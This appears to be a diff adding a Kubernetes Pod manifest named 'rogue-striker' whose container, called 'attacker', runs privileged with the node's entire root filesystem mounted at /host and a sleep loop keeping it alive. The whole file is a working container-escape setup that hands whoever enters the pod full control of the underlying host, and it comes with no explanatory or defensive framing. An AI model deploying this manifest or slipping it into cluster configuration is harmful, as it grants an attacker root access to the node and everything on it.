@@ -1,0 +1,21 @@
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rogue-striker
+  namespace: default
+spec:
+  containers:
+  - name: attacker
+    image: ubuntu
+    command: ["/bin/bash", "-c", "--"]
+    args: ["while true; do sleep 30; done;"]
+    securityContext:
+      privileged: true  
+    volumeMounts:
+    - name: host
+      mountPath: /host  
+  volumes:
+  - name: host
+    hostPath:
+      path: / 
